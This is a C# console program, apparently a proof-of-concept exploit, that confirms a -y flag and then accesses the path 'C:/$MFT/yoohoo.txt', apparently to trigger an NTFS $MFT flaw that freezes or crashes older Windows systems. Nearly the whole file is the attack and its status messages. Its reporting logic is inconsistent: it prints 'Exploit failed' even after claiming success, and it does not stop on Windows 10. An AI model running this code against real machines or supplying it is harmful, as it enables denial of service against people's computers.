using Microsoft.Win32;
using System;
using System.IO;
using System.Threading;

namespace BuffaloWire
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            var windowsName = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\", "ProductName", "");
            info();
            Console.WriteLine(" "+windowsName);
            if (windowsName.ToString().Contains("Windows 10"))
            {
                info();
                Console.WriteLine(" Bug does not affect Windows 10.");
            }
            // check to make sure that there is a parameter
            try { string p2c = args[0]; }
            catch
            {
                negative(); Console.WriteLine(" You must verify that you want to run this exploit with -y");
                negative(); Console.WriteLine(" Exploit failed, and cannot continue."); Environment.Exit(0);
            }
            string p2e = args[0];
            string p2f = p2e.ToLower();
            if (p2f == "-y" || p2f == "--y" || p2f == "-yes" || p2f == "--yes" || p2f == "/yes" || p2f == "/y")
            {
                try
                {
                    positive();
                    Console.WriteLine(" Exploiting...");
                    try
                    {
                        File.Exists("C:/$MFT/yoohoo.txt");
                    }
                    catch
                    {
                        positive();
                        Console.WriteLine(" Exploit completed!");
                    }
                    negative();
                    Console.WriteLine(" Are you sure the target is vulnerable?!");
                    negative();
                    Console.WriteLine(" Exploit failed.");
                    Environment.Exit(0);

                }
                catch(Exception a)
                {
                    negative();
                    Console.WriteLine(" Exploit failed, and cannot continue.");
                    negative();
                    Console.WriteLine(" Error: " + a);
                    Environment.Exit(0);
                }
            }
            else
            {
                negative();
                Console.WriteLine(" User did not confirm using -y, --y, -yes, --yes, /yes, or /y");
                negative();
                Console.WriteLine(" Exploit failed.");
            }
        }

        public static void positive()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[+]");
            Console.ForegroundColor = ConsoleColor.Gray;
        }

        public static void negative()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[-]");
            Console.ForegroundColor = ConsoleColor.Gray;
        }

        public static void info()
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.Write("[@]");
            Console.ForegroundColor = ConsoleColor.Gray;
        }
    }
}